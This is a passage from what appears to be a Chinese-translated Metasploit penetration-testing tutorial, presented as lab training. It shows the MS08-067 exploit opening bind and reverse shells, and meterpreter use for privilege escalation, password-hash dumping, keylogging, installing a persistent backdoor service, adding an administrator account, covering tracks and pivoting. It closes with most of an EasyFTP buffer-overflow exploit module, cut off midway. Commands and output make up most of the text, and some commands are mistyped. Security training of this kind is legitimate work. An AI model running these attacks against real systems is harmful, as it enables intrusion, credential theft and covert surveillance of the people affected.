 # msfcli windows/smb/ms08_067_netapi O
    [*] Please wait while we load the module tree...

       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       RHOST                     yes       The target address
       RPORT    445              yes       Set the SMB service port
    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER,  SRVSVC) 
```

在前面命令的末尾使用`O`指令框架显示所选利用的可用选项。以下命令使用`RHOST`参数设置目标 IP：

```
 # msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.7 P
    [*] Please wait while we load the module tree...

    Compatible payloads
    ===================

       Name                             Description
       ----                             -----------
    generic/debug_trap               Generate a debug trap in the target process
    generic/shell_bind_tcp           Listen for a connection and spawn a command shell
    ... 
```

最后，在使用`RHOST`参数设置目标 IP 之后，是时候选择兼容的有效载荷并执行我们的利用了：

```
 # msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.7 LHOST=192.168.0.3 PAYLOAD=windows/shell/reverse_tcp E
    [*] Please wait while we load the module tree...
    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.0.7
    [*] Command shell session 1 opened (192.168.0.3:4444 -> 192.168.0.7:1027)

    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.

    C:WINDOWSsystem32> 
```

正如你所看到的，我们在为所选有效载荷设置`LHOST`参数后，已经获得了对目标机器的本地 shell 访问。

# 忍者 101 训练

本节提供的示例将阐明您对利用框架进行各种方式的理解。不可能涵盖每一个方面，或者使用 Metasploit 框架，但我们已经仔细研究并提取了最重要的功能供您练习。要深入了解 Metasploit 框架，我们强烈建议您阅读在线教程*Metasploit Unleashed*，网址为[`www.offensive-security.com/metasploit-unleashed/`](http://www.offensive-security.com/metasploit-unleashed/)。该教程包含了来自渗透测试角度的高级材料，包括有关利用开发、漏洞研究和评估技术的见解。

# 场景 1

在这个练习中，我们将演示如何利用 Metasploit 框架进行端口扫描、操作系统指纹识别和服务识别，使用集成的 Nmap 工具。在 MSFConsole 上，执行以下命令：

```
 msf> load db_tracker
    [*] Successfully loaded plugin: db_tracker 
```

如果遇到数据库连接错误，可以使用以下两个命令：

`Systemclt start postgresql`

`Msfdb inint`

数据库跟踪器将保存会话获取的数据以供进一步使用。要开始 Nmap 扫描，请输入以下内容：

```
    msf>db_nmap -T Aggressive -sV -n -O -v 192.168.0.7 Starting Nmap 5.00 ( http://nmap.org ) at 2010-11-11 22:34 UTC NSE: Loaded 3 scripts for scanning. Initiating ARP Ping Scan at 22:34 Scanning 192.168.0.7 [1 port] Completed ARP Ping Scan at 22:34, 0.00s elapsed (1 total hosts) Initiating SYN Stealth Scan at 22:34 Scanning 192.168.0.7 [1000 ports] Discovered open port 445/tcp on 192.168.0.7 Discovered open port 135/tcp on 192.168.0.7 Discovered open port 25/tcp on 192.168.0.7 Discovered open port 139/tcp on 192.168.0.7 Discovered open port 3389/tcp on 192.168.0.7 Discovered open port 80/tcp on 192.168.0.7 Discovered open port 443/tcp on 192.168.0.7 Discovered open port 21/tcp on 192.168.0.7 Discovered open port 1025/tcp on 192.168.0.7 Discovered open port 1433/tcp on 192.168.0.7 Completed SYN Stealth Scan at 22:34, 3.04s elapsed (1000 total ports) Initiating Service scan at 22:34
    Scanning 10 services on 192.168.0.7
    Completed Service scan at 22:35, 15.15s elapsed (10 services on 1 host)
    Initiating OS detection (try #1) against 192.168.0.7
    ...
    PORT     STATE SERVICE       VERSION
    21/tcpopen  ftp           Microsoft ftpd
    25/tcpopen  smtp          Microsoft ESMTP 6.0.2600.2180
    80/tcpopen  http          Microsoft IIS httpd 5.1
    135/tcp  openmsrpc         Microsoft Windows RPC
    139/tcp  opennetbios-ssn
    443/tcp  open  https?
    445/tcp  openmicrosoft-ds  Microsoft Windows XP microsoft-ds
    1025/tcpopen  msrpc         Microsoft Windows RPC
    1433/tcpopen  ms-sql-s      Microsoft SQL Server 2005 9.00.1399; RTM
    3389/tcpopen  microsoft-rdp Microsoft Terminal Service
    MAC Address: 00:0B:6B:68:19:91 (WistronNeweb)
    Device type: general purpose
    Running: Microsoft Windows 2000|XP|2003
    OS details: Microsoft Windows 2000 SP2 - SP4, Windows XP SP2 - SP3, or Windows Server 2003 SP0 - SP2
    Network Distance: 1 hop
    TCP Sequence Prediction: Difficulty=263 (Good luck!)
    IP ID Sequence Generation: Incremental
    Service Info: Host: custdesk; OS: Windows
    ...
    Nmap done: 1 IP address (1 host up) scanned in 20.55 seconds
               Raw packets sent: 1026 (45.856KB) | Rcvd: 1024 (42.688KB)

```

此时，我们已成功扫描了目标并将结果保存在当前数据库会话中。要列出发现的目标和服务，您可以分别使用`db_hosts`和`db_services`命令。此外，如果您已经单独使用 Nmap 程序扫描了目标并将结果保存为 XML 格式，您可以使用`db_import_nmap_xml`命令将这些结果导入 Metasploit。

# 场景 2

在这个例子中，我们将说明 Metasploit 框架中的一些辅助功能。关键是要理解它们在漏洞分析过程中的重要性。

# SMB 用户名

该模块将对目标 IP 地址进行扫描，尝试查找与**服务器消息块**（**SMB**）相关联的用户名。该服务用于应用程序访问文件共享、打印机或网络设备之间的通信。使用 Metasploit 辅助扫描器之一，我们可以确定可能的用户名。

首先，通过输入以下内容在 Metasploit 中搜索扫描器：

```
 msf> search SMB 
```

然后，我们可以看到用于扫描开放 SMB 服务的不同扫描器的数量：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/3dab00b7-fa86-49c8-89fe-d537d2bc740b.png)

要使用扫描器，请输入以下内容：

```
 msf> use auxiliary/scanner/smb/smb_enumershares 
```

将`RHOSTS`参数设置为网络范围，即`192.168.0.1/24`，输入以下内容：

```
 msf> set RHOSTS 192.168.0.1/24 
```

然后，输入以下内容：

```
 msf> run 
```

扫描结果表明有一个带有`METASPLOITABLE`用户名的 SMB 服务正在运行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/3a9213aa-2a64-426c-a5cf-e9a889b71620.png)

这可能表明存在可以被攻击的共享或其他网络服务。当我们开始破解用户凭据和密码时，`METASPLOIT`用户名也可以为我们提供一个起点。

# VNC 空白认证扫描器

该模块将扫描 IP 地址范围内的**虚拟网络计算**（**VNC**）服务器，这些服务器可以在没有任何认证详细信息的情况下访问：

```
 msf> use auxiliary/scanner/vnc/vnc_none_auth
    msf auxiliary(vnc_none_auth) > show options
    msf auxiliary(vnc_none_auth) > set RHOSTS 10.4.124.0/24
    RHOSTS => 10.4.124.0/24
    msf auxiliary(vnc_none_auth) > run
    [*] 10.4.124.22:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.23:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.25:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] Scanned 026 of 256 hosts (010% complete)
    [*] 10.4.124.26:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.27:5900, VNC server security types supported : None,  free access!
    [*] 10.4.124.28:5900, VNC server security types supported : None,  free access!
    [*] 10.4.124.29:5900, VNC server protocol version : "RFB 004.000",  not supported!
    ...
    [*] 10.4.124.224:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.225:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.227:5900, VNC server security types supported : None,  free access!
    [*] 10.4.124.228:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.229:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] Scanned 231 of 256 hosts (090% complete)
    [*] Scanned 256 of 256 hosts (100% complete)
    [*] Auxiliary module execution completed 
```

请注意，我们发现了一些可以在没有认证的情况下访问的 VNC 服务器。如果没有启用授权控制，这种攻击向量可能对系统管理员构成严重威胁，并且可能轻易地邀请来自互联网的不受欢迎的访客访问您的 VNC 服务器。

# PostGRESQL 登录

在之前的章节中，我们在对 Metasploitable 操作系统进行 Nmap 扫描时发现了运行在端口`5432`上的 PostgreSQL 数据库服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ba867ce8-b274-4ebc-bc5b-2f435f5455c7.png)

我们可以利用 Metasploit 辅助扫描器来确定数据库的登录信息。首先，我们通过输入以下内容来配置 Metasploit 来使用扫描器：

```
 msf> use auxiliary/scanner/postgres/postgres_login
```

接下来，我们想要配置两个选项。第一个选项设置扫描器继续扫描，即使它找到了成功的登录。这使我们能够扫描多个数据库实例，并枚举许多用户名和密码。我们通过输入以下内容来配置这个选项：

```
 msf> set STOP_ON_SUCCESS true 
```

其次，我们设置要扫描的主机。扫描器将采用 CIDR 范围或单个 IP 地址。在这种情况下，我们将把扫描器指向`192.168.0.30`上的 Metasploitable OS，因为我们在 Nmap 扫描中已经确定在该 IP 地址上有一个活动实例。我们通过输入以下内容来设置这一点：

```
 msf> set RHOSTS 192.168.0.30
```

然后我们运行利用程序。当我们检查输出时，我们可以看到该数据库的用户名和密码已被找到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/53efbb30-f0b7-4273-921e-3fcf0f6b65c4.png)

数据库安全对组织至关重要，因为数据库通常包含机密信息。诸如 PostgreSQL 之类的扫描器使我们能够以高效的方式测试组织的核心机密信息周围的安全性。

# 情景 3

现在我们将探讨一些常见负载（绑定、反向和 Meterpreter），并从利用的角度讨论它们的功能。这个练习将让你了解何时以及如何使用特定的负载。

# 绑定 shell

绑定 shell 是一种远程 shell 连接，它在成功利用和执行 shellcode 设置绑定端口监听器后提供对目标系统的访问。这为攻击者打开了一个通道，使其能够使用 Netcat 等工具在绑定 shell 端口上连接回受损机器，从而可以通过 TCP 连接隧道传输标准输入（stdin）和输出（stdout）。这种情况的工作方式类似于 Telnet 客户端建立到 Telnet 服务器的连接，并且适用于攻击者位于**网络地址转换**（**NAT**）或防火墙之后，无法从受损主机直接联系攻击者 IP 的环境。

以下是开始利用和设置绑定 shell 的命令：

```
 msf> use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > show options
    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
    RHOST => 192.168.0.7
    msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/bind_tcp
    PAYLOAD => windows/shell/bind_tcp
    msf exploit(ms08_067_netapi) > exploit

    [*] Started bind handler
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.0.7
    [*] Command shell session 1 opened (192.168.0.3:41289 -> 192.168.0.7:4444) at Sat Nov 13 19:01:23 +0000 2010
    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.

    C:WINDOWSsystem32> 
```

因此，我们已经分析了 Metasploit 也自动化了使用集成的多负载处理程序连接到绑定 shell 的过程。在编写自己的利用程序并使用绑定 shellcode 时，Netcat 等工具可以派上用场，这需要第三方处理程序来建立到受损主机的连接。您可以在[`en.wikipedia.org/wiki/Netcat`](http://en.wikipedia.org/wiki/Netcat)上阅读有关 Netcat 在各种网络安全操作中的实际用例。

# 反向 shell

反向 shell 是绑定 shell 的完全相反。它不是在目标系统上绑定端口并等待来自攻击者机器的连接，而是简单地连接回攻击者的 IP 和端口，并生成一个 shell。反向 shell 的一个显著特点是考虑到目标位于 NAT 或防火墙之后，阻止公共访问其系统资源。

以下是开始利用和设置反向 shell 的命令：

```
 msf> use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
    RHOST => 192.168.0.7
    msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/reverse_tcp
    PAYLOAD => windows/shell/reverse_tcp
    msf exploit(ms08_067_netapi) > show options
    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3
    LHOST => 192.168.0.3
    msf exploit(ms08_067_netapi) > exploit

    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.0.7
    [*] Command shell session 1 opened (192.168.0.3:4444 -> 192.168.0.7:1027) at Sat Nov 13 22:59:02 +0000 2010
    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.

    C:WINDOWSsystem32> 
```

您可以通过攻击者的 IP 清楚地区分反向 shell 和绑定 shell。在反向 shell 配置中，我们必须提供攻击者的 IP（例如，`LHOST` `192.168.0.3`），而在绑定 shell 中则不需要提供。

内联和分段负载之间有什么区别？内联负载是一个单独的自包含 shellcode，它将在一次利用实例中执行，而分段负载创建了攻击者和受害者机器之间的通信通道，以读取其余分段 shellcode 以执行特定任务。选择分段负载是常见做法，因为它们比内联负载要小得多。

# Meterpreters

meterpreter 是一种高级、隐秘、多面的、动态可扩展的有效载荷，通过将反射式 DLL 注入目标内存来操作。脚本和插件可以在运行时动态加载，以扩展后期利用活动的目的。这包括提权、转储系统帐户、键盘记录、持久后门服务和启用远程桌面。此外，整个 meterpreter shell 的通信默认情况下是加密的。

以下是开始利用和设置 meterpreter 有效载荷的命令：

```
 msf> use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
    RHOST => 192.168.0.7
    msf exploit(ms08_067_netapi) > show payloads
    ...
    msf exploit(ms08_067_netapi) > set PAYLOAD  windows/meterpreter/reverse_tcp
    PAYLOAD => windows/meterpreter/reverse_tcp
    msf exploit(ms08_067_netapi) > show options
    ...
    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3
    LHOST => 192.168.0.3
    msf exploit(ms08_067_netapi) > exploit

    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (749056 bytes) to 192.168.0.7
    [*] Meterpreter session 1 opened (192.168.0.3:4444 -> 192.168.0.7:1029) at Sun Nov 14 02:44:26 +0000 2010
    meterpreter> help
    ... 
```

正如您所看到的，我们已成功获得了 meterpreter shell。通过输入，我们将能够看到各种可用于我们的命令。让我们检查我们当前的特权，并使用名为`getsystem`的 meterpreter 脚本将它们提升到`SYSTEM`级别：

```
    meterpreter>getuid
    Server username: CUSTDESKsalesdept
    meterpreter> use priv
    meterpreter>getsystem -h
    ...
```

这将显示提升我们特权的技术数量。通过使用默认命令`getsystem`，不带任何选项，它将针对目标尝试每种技术，并在成功时立即停止：

```
 meterpreter>getsystem
    ...got system (via technique 1).
    meterpreter>getuid
    Server username: NT AUTHORITYSYSTEM
    meterpreter>sysinfo
    Computer: CUSTDESK
    OS      : Windows XP (Build 2600, Service Pack 2).
    Arch    : x86
    Language: en_US 
```

如果您选择执行`-j -z`利用命令，则将利用执行推送到后台，并且不会出现交互式 meterpreter shell。但是，如果会话已成功建立，那么您可以使用会话`-i`ID 与特定会话进行交互，或者通过键入会话`-l`获取活动会话的列表以获取确切的 ID 值。

让我们利用 meterpreter shell 的功能，并使用以下命令转储目标持有的当前系统帐户和密码。这些将以 NTLM 哈希格式显示，并可以通过使用以下命令的几种工具和技术来破解：

```
 meterpreter> run hashdump
    [*] Obtaining the boot key...
    [*] Calculating the hboot key using SYSKEY 71e52ce6b86e5da0c213566a1236f892...
    [*] Obtaining the user list and keys...
    [*] Decrypting user keys...
    [*] Dumping password hashes...
    h
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    HelpAssistant:1000:d2cd5d550e14593b12787245127c866d:d3e35f657c924d0b31eb811d2d986df9:::
    SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:c8edf0d0db48cbf7b2835ec013cfb9c5:::
    Momin Desktop:1003:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204beb12283678:::
    IUSR_MOMINDESK:1004:a751dcb6ea9323026eb8f7854da74a24:b0196523134dd9a21bf6b80e02744513:::
    ASPNET:1005:ad785822109dd077027175f3382059fd:21ff86d627bcf380a5b1b6abe5d8e1dd:::
    IWAM_MOMINDESK:1009:12a75a1d0cf47cd0c8e2f82a92190b42:c74966d83d519ba41e5196e00f94e113:::
    h4x:1010:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204beb12283678:::
    salesdept:1011:8f51551614ded19365b226f9bfc33fab:7ad83174aadb77faac126fdd377b1693::: 
```

现在，让我们通过使用 meterpreter shell 的键盘记录功能，使用以下命令将此活动进一步记录下来，这可能会从我们的目标中揭示一些有用的数据：

```
 meterpreter>getuid
    Server username: NT AUTHORITYSYSTEM
    meterpreter>ps
    Process list
    ============

     PID   Name              Arch  Session  User                           Path
     ---   ----              ----  -------  ----                           ----
     0     [System Process]
     4     System            x86   0        NT AUTHORITYSYSTEM
     384   smss.exe          x86   0        NT AUTHORITYSYSTEM            SystemRootSystem32smss.exe
     488   csrss.exe         x86   0        NT AUTHORITYSYSTEM            ??C:WINDOWSsystem32csrss.exe
     648   winlogon.exe      x86   0        NT AUTHORITYSYSTEM            ??C:WINDOWSsystem32winlogon.exe
     692   services.exe      x86   0        NT AUTHORITYSYSTEM            C:WINDOWSsystem32services.exe
     704   lsass.exe         x86   0        NT AUTHORITYSYSTEM            C:WINDOWSsystem32lsass.exe
    ...
    148   alg.exe           x86   0        NT AUTHORITYLOCAL SERVICE     C:WINDOWSSystem32alg.exe
    3172  explorer.exe      x86   0        CUSTDESKsalesdept C:WINDOWSExplorer.EXE
    3236  reader_sl.exe     x86   0        CUSTDESKsalesdept C:Program FilesAdobeReader 9.0ReaderReader_sl.exe 
```

在这个阶段，我们将将 meterpreter shell 迁移到`explorer.exe`进程（`3172`），以便使用以下命令开始记录系统上当前用户的活动：

```
 meterpreter> migrate 3172
    [*] Migrating to 3172...
    [*] Migration completed successfully.
    meterpreter>getuid
    Server username: CUSTDESKsalesdept
    meterpreter>keyscan_start
    Starting the keystroke sniffer... 
```

我们现在已经启动了我们的键盘记录器，应该等一段时间来获取记录的数据块：

```
 meterpreter>keyscan_dump
    Dumping captured keystrokes...
    <Return> www.yahoo.com <Return><Back> www.bbc.co.uk <Return>
    meterpreter>keyscan_stop
    Stopping the keystroke sniffer... 
```

正如您所看到的，我们已经转储了目标的网络浏览活动。同样，我们还可以通过将`winlogon.exe`进程（`648`）迁移来捕获登录到系统的所有用户的凭据。

您已经利用并获得了对目标系统的访问权限，但现在希望保持此访问权限，即使在以后的阶段修补了被利用的服务或应用程序。这种活动通常被称为后门服务。请注意，meterpreter shell 提供的后门服务在访问目标系统上的特定网络端口之前不需要进行身份验证。这可能允许一些不速之客访问您的目标，并构成重大风险。作为渗透测试规则的一部分，通常不允许这种活动。因此，我们强烈建议您将后门服务远离官方的渗透测试环境。您还应确保在范围和规则确定阶段明确允许了这一点：

```
 msf exploit(ms08_067_netapi) > exploit
    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (749056 bytes) to 192.168.0.7
    [*] Meterpreter session 1 opened (192.168.0.3:4444 -> 192.168.0.7:1032) at Tue Nov 16 19:21:39 +0000 2010
    meterpreter>ps
    ...
     292   alg.exe           x86   0        NT AUTHORITYLOCAL SERVICE     C:WINDOWSSystem32alg.exe
    1840  csrss.exe         x86   2        NT AUTHORITYSYSTEM            ??C:WINDOWSsystem32csrss.exe
     528   winlogon.exe      x86   2        NT AUTHORITYSYSTEM            ??C:WINDOWSsystem32winlogon.exe
     240   rdpclip.exe       x86   0        CUSTDESKMomin Desktop         C:WINDOWSsystem32rdpclip.exe
    1060  userinit.exe      x86   0        CUSTDESKMomin Desktop         C:WINDOWSsystem32userinit.exe
    1544  explorer.exe      x86   0        CUSTDESKMomin Desktop         C:WINDOWSExplorer.EXE
    ...
    meterpreter> migrate 1544
    [*] Migrating to 1544...
    [*] Migration completed successfully.
    meterpreter> run metsvc -h
    ...
    meterpreter> run metsvc
    [*] Creating a meterpreter service on port 31337
    [*] Creating a temporary installation directory  C:DOCUME~1MOMIND~1LOCALS~1TempoNyLOPeS...
    [*]  >> Uploading metsrv.dll...
    [*]  >> Uploading metsvc-server.exe...
    [*]  >> Uploading metsvc.exe...
    [*] Starting the service...
             * Installing service metsvc
     * Starting service
    Service metsvc successfully installed. 
```

因此，我们最终在我们的目标上启动了后门服务。我们将关闭当前的 meterpreter 会话，并使用`windows/metsvc_bind_tcp`有效载荷的`multi/handler`与我们的后门服务进行交互：

```
 meterpreter> exit
 [*] Meterpreter session 1 closed. Reason: User exit msf exploit(ms08_067_netapi) > back msf> use exploit/multi/handler msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp PAYLOAD => windows/metsvc_bind_tcp msf exploit(handler) > set LPORT 31337 LPORT => 31337 msf exploit(handler) > set RHOST 192.168.0.7 RHOST => 192.168.0.7 msf exploit(handler) > exploit [*] Starting the payload handler... [*] Started bind handler [*] Meterpreter session 2 opened (192.168.0.3:37251 -> 192.168.0.7:31337) at Tue Nov 16 20:02:05 +0000 2010 meterpreter>getuid Server username: NT AUTHORITYSYSTEM
```

让我们使用另一个有用的 meterpreter 脚本`getgui`，为我们的目标启用远程桌面访问。以下练习将在目标上创建一个新用户帐户，并在以前禁用远程桌面服务的情况下启用远程桌面服务：

```
 meterpreter> run getgui -u btuser -p btpass
    [*] Windows Remote Desktop Configuration Meterpreter Script by  Darkoperator
    [*] Carlos Perez carlos_perez@darkoperator.com
    [*] Language set by user to: 'en_EN'
    [*] Setting user account for logon
    [*]     Adding User: btuser with Password: btpass
    [*]     Adding User: btuser to local group 'Remote Desktop Users'
    [*]     Adding User: btuser to local group 'Administrators'
    [*] You can now login with the created user
    [*] For cleanup use command: run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up__20101116.3447.rc 
```

现在，我们可以使用`rdesktop`程序登录到我们的目标系统，方法是在另一个终端上输入以下命令：

```
 # rdesktop 192.168.0.7:3389 
```

请注意，如果您已经拥有目标机器上任何现有用户的破解密码，您可以简单地执行`run getgui -e`命令来启用远程桌面服务，而不是添加新用户。此外，请不要忘记通过执行上一个输出末尾引用的`getgui/clean_up`脚本来清理系统中的痕迹。

我应该如何通过深入访问无法从外部访问的目标网络来扩展我的攻击范围？Metasploit 提供了使用`route add targetSubnettargetSubnetMaskSessionId`命令查看和添加到目标网络的新路由的能力（例如，route add `10.2.4.0 255.255.255.0 1`）。这里，`SessionId`参数指向现有的 meterpreter 会话（网关），而`targetsubnet`参数是另一个网络地址（或双重家庭以太网网络地址），位于我们受损目标之外。一旦您设置 Metasploit 通过受损主机会话路由所有流量，我们就准备好进一步渗透通常无法从我们这边路由的网络。这通常被称为枢纽或立足点。

# 编写利用模块

开发利用是 Metasploit 框架中最有趣的方面之一。在本节中，我们将简要讨论围绕利用开发的核心问题，并通过从现有框架数据库中获取的实时示例解释其关键骨架。然而，在尝试编写自己的利用模块之前，熟练掌握 Ruby 编程语言非常重要。另一方面，中级的逆向工程技能和对漏洞发现工具（例如模糊测试工具和调试器）的实际理解为利用构建提供了一张开放的地图。本节仅作为该主题的介绍，而不是完整的指南。

对于我们的示例，我们选择了漏洞（EasyFTP Server <= 1.7.0.11 MKD Command Stack Buffer Overflow），它将提供对 Easy FTP Server 应用程序中缓冲区溢出漏洞的基本视图。您可以将此模块移植到其他 FTP 服务器应用程序中发现的类似漏洞，并有效利用您的时间。漏洞代码位于`/usr/share/metasploit-framework/modules/exploits/windows/ftp/easyftp_mkd_fixret.rb`：

```
 ##
    # $Id: easyftp_mkd_fixret.rb 9935 2010-07-27 02:25:15Z jduck $
    ## 
```

上述代码是表示文件名、修订号以及漏洞的日期和时间值的基本标头：

```
 ##
    # This file is part of the Metasploit Framework and may be subject  to
    # redistribution and commercial restrictions. Please see the  Metasploit
    # Framework web site for more information on licensing and terms  of use.
    # http://metasploit.com/framework/
    ##
    require 'msf/core' 
```

MSF 核心库需要在利用开始时进行初始化：

```
class Metasploit3 <Msf::Exploit::Remote 
```

在上述代码中，`Exploitmixin/`类是为远程 TCP 连接提供各种选项和方法的类，例如`RHOST`、`RPORT`、`Connect()`、`Disconnect()`和`SSL()`。以下代码是根据其频繁需求和使用分配给漏洞的等级：

```
 Rank = GreatRanking 
```

在以下代码中，`Ftp mixin/`类与 FTP 服务器建立连接：

```
includeMsf::Exploit::Remote::Ftp 
```

以下代码提供了有关漏洞的通用信息，并指向已知的参考资料：

```
def initialize(info = {}) 
super(update_info(info, 
      'Name'           => 'EasyFTP Server <= 1.7.0.11 MKD Command  Stack Buffer Overflow', 
      'Description'    => %q{ 
          This module exploits a stack-based buffer overflow in  EasyFTP Server 1.7.0.11 
and earlier. EasyFTP fails to check input size when  parsing 'MKD' commands, which 
leads to a stack based buffer overflow. 

        NOTE: EasyFTP allows anonymous access by default. However,  in order to access the 
        'MKD' command, you must have access to an account that can create directories. 

        After version 1.7.0.12, this package was renamed  "UplusFtp". 

        This exploit utilizes a small piece of code that I've  referred to as 'fixRet'. 
        This code allows us to inject of payload of ~500 bytes  into a 264 byte buffer by 
        'fixing' the return address post-exploitation.  See  references for more information. 
      }, 
      'Author'         => 
        [ 
          'x90c',   # original version 
          'jduck'   # port to metasploit / modified to use fix-up  stub (works with bigger payloads) 
        ], 
      'License'        => MSF_LICENSE, 
      'Version'        => '$Revision: 9935 $', 
      'References'     => 
        [ 
[ 'OSVDB', '62134' ], 
[ 'URL', 'http://www.exploit-db.com/exploits/12044/' ], 
[ 'URL', 'http://www.exploit-db.com/exploits/14399/' ] 
        ], 
```

以下代码指示有效载荷在执行过程完成后清理自身：

```
 'DefaultOptions' => 
        { 
          'EXITFUNC' => 'thread' 
```

以下代码片段定义了 512 字节的空间供 shellcode 使用，列出了应该终止我们有效载荷传递的不良字符，并禁用了 NOP 填充：

```
 }, 
      'Privileged'     => false, 
      'Payload'        => 
        { 
          'Space'    => 512, 
          'BadChars' => "x00x0ax0dx2fx5c", 
          'DisableNops' => true 
        }, 
```

以下代码片段提供了有关目标平台和定义易受攻击目标（`0`到`9`）的说明，列出了 Easy FTP Server 的不同版本（`1.7.0.2`至`1.7.0.11`），每个版本都基于应用程序二进制文件（`ftpbasicsvr.exe`）的唯一返回地址。此外，还添加了漏洞披露日期，并将默认目标设置为`0`（`v1.7.0.2`）：

```
 'Platform'       => 'win', 
      'Targets'        => 
        [ 
[ 'Windows Universal - v1.7.0.2',   { 'Ret' =>           0x004041ec } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.3',   { 'Ret' =>           0x004041ec } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.4',   { 'Ret' =>           0x004041dc } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.5',   { 'Ret' =>           0x004041a1 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.6',   { 'Ret' =>           0x004041a1 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.7',   { 'Ret' =>           0x004041a1 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.8',   { 'Ret' =>           0x00404481 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.9',   { 'Ret' =>           0x00404441 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.10',  { 'Ret' =>           0x00404411 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.11',  { 'Ret' =>           0x00404411 } ], # call ebp - from ftpbasicsvr.exe 
        ], 
      'DisclosureDate' => 'Apr 04 2010', 
      'DefaultTarget' => 0)) 
```

在以下代码中，`check()`函数确定目标是否易受攻击：

```
end 

def check 
connect 
disconnect 

if (banner =~ /BigFoolCat/) 
return Exploit::CheckCode::Vulnerable 
end 
return Exploit::CheckCode::Safe 
end 
```

以下代码定义了一个生成 NOP 滑梯以帮助 IDS/IPS/AV 规避的函数。一些人认为 NOP 滑梯是解决这个问题的一个快速而肮脏的解决方案，并认为除非有特别好的理由，否则不应该使用它们。为简单起见，在编写模块的示例中，我们在代码中保留了该函数：

```
defmake_nops(num); "C" * num; end 
```

以下过程修复了一个返回地址，从这个地址可以执行有效负载。从技术上讲，它解决了栈寻址的问题：

```
def exploit 
connect_login 

    # NOTE: 
    # This exploit jumps to ebp, which happens to point at a      partial version of 
    # the 'buf' string in memory. The fixRet below fixes up the      code stored on the 
    # stack and then jumps there to execute the payload. The value      inesp is used 
    # with an offset for the fixup. 
fixRet_asm = %q{ 
movedi,esp 
subedi, 0xfffffe10 
mov [edi], 0xfeedfed5 
addedi, 0xffffff14 
jmpedi 
    } 
fixRet = Metasm::Shellcode.assemble(Metasm::Ia32.new,  fixRet_asm).encode_string 

buf = '' 
```

最初，利用缓冲区包含编码的返回地址和随机化的 NOP 指令：

```
print_status("Prepending fixRet...") 
buf<<fixRet 
buf<<make_nops(0x20 - buf.length)
```

以下代码在运行时向我们的利用程序中添加了一个动态生成的 shellcode：

```
print_status("Adding the payload...") 
buf<<payload.encoded 
```

